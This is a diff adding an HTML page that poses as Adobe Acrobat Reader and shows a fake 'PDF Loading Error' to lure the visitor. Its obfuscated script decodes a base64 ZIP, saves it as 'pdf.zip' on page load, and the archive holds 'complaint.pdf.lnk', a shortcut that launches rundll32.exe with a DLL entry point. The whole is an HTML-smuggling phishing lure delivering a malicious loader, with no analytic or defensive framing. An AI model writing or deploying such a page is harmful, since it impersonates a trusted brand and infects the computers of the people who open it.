@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat Reader</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
+        .container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .toolbar {
+            background-color: #333;
+            color: white;
+            padding: 5px 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .toolbar-left {
+            display: flex;
+            align-items: center;
+        }
+        .toolbar-left img {
+            height: 24px;
+            margin-right: 10px;
+        }
+        .toolbar-left span {
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .toolbar-right {
+            display: flex;
+            gap: 10px;
+        }
+        .toolbar-right button {
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            margin: 10px;
+        }
+        .error-message {
+            text-align: center;
+            padding: 20px;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            max-width: 500px;
+        }
+        .error-message h2 {
+            color: #721c24;
+            font-size: 18px;
+            margin: 0 0 10px;
+        }
+        .error-message p {
+            color: #721c24;
+            font-size: 14px;
+            margin: 0 0 15px;
+        }
+        .error-message a {
+            color: #0056b3;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        /* Hidden smuggling payload */
+        #smuggledPayload {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Toolbar mimicking Adobe Acrobat Reader -->
+        <div class="toolbar">
+            <div class="toolbar-left">
+                <img src="https://www.adobe.com/favicon.ico" alt="Adobe Logo">
+                <span>Adobe Acrobat Reader DC - Document.pdf</span>
+            </div>
+            <div class="toolbar-right">
+                <button>View</button>
+                <button>Edit</button>
+                <button>Sign</button>
+                <button>Tools</button>
+                <button>Window</button>
+                <button>Help</button>
+            </div>
+        </div>
+        <!-- Main content with fake error -->
+        <div class="content">
+            <div class="error-message">
+                <h2>PDF Loading Error</h2>
+                <p>Sorry, there was an issue loading "Document.pdf". The file may be corrupted or incompatible with this viewer.</p>
+                <p>Please <a onclick="triggerDownload()">download the file</a> to try opening it with an alternative viewer.</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        var _0x4d3afb=_0xf889;(function(_0x3ff649,_0x31b5d0){var _0x538ca4=_0xf889,_0x1876d9=_0x3ff649();while(!![]){try{var _0x3b413f=parseInt(_0x538ca4(0x191))/0x1+-parseInt(_0x538ca4(0x18a))/0x2+-parseInt(_0x538ca4(0x18b))/0x3*(-parseInt(_0x538ca4(0x18f))/0x4)+parseInt(_0x538ca4(0x185))/0x5+-parseInt(_0x538ca4(0x194))/0x6+parseInt(_0x538ca4(0x183))/0x7*(parseInt(_0x538ca4(0x198))/0x8)+-parseInt(_0x538ca4(0x181))/0x9;if(_0x3b413f===_0x31b5d0)break;else _0x1876d9['push'](_0x1876d9['shift']());}catch(_0x57245b){_0x1876d9['push'](_0x1876d9['shift']());}}}(_0x44c7,0x77aff));function _0x44c7(){var _0x2bb0e2=['226152JtSYIO','pdf.zip','click','display:\x20none','4912dAKWvg','length','createObjectURL','5318883qrxmiL','style','1582rlhKTF','createElement','4090610yMciWM','navigator','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','appendChild','atob','1057696SmrjPX','763041FLbJGk','URL','href','body','4rSManj','msSaveBlob','436533qGJtiU','download','revokeObjectURL'];_0x44c7=function(){return _0x2bb0e2;};return _0x44c7();}function base64ToArrayBuffer(_0x9f5639){var _0x320b89=_0xf889,_0x236b18=window[_0x320b89(0x189)](_0x9f5639),_0x9ab473=_0x236b18[_0x320b89(0x199)],_0x1faed9=new Uint8Array(_0x9ab473);for(var _0x5c964a=0x0;_0x5c964a<_0x9ab473;_0x5c964a++){_0x1faed9[_0x5c964a]=_0x236b18['charCodeAt'](_0x5c964a);}return _0x1faed9['buffer'];}function _0xf889(_0x910c71,_0x59c7c5){var _0x44c759=_0x44c7();return _0xf889=function(_0xf889b8,_0x5e80b8){_0xf889b8=_0xf889b8-0x181;var _0x293d0f=_0x44c759[_0xf889b8];return _0x293d0f;},_0xf889(_0x910c71,_0x59c7c5);}var file=_0x4d3afb(0x187),data=base64ToArrayBuffer(file),blob=new Blob([data],{'type':'octet/stream'}),fileName=_0x4d3afb(0x195);if(window[_0x4d3afb(0x186)]['msSaveOrOpenBlob'])window[_0x4d3afb(0x186)][_0x4d3afb(0x190)](blob,fileName);else{var a=document[_0x4d3afb(0x184)]('a');document[_0x4d3afb(0x18e)][_0x4d3afb(0x188)](a),a[_0x4d3afb(0x182)]=_0x4d3afb(0x197);var url=window[_0x4d3afb(0x18c)][_0x4d3afb(0x19a)](blob);a[_0x4d3afb(0x18d)]=url,a[_0x4d3afb(0x192)]=fileName,a[_0x4d3afb(0x196)](),window['URL'][_0x4d3afb(0x193)](url);}
+    </script>
+</body>
+</html>
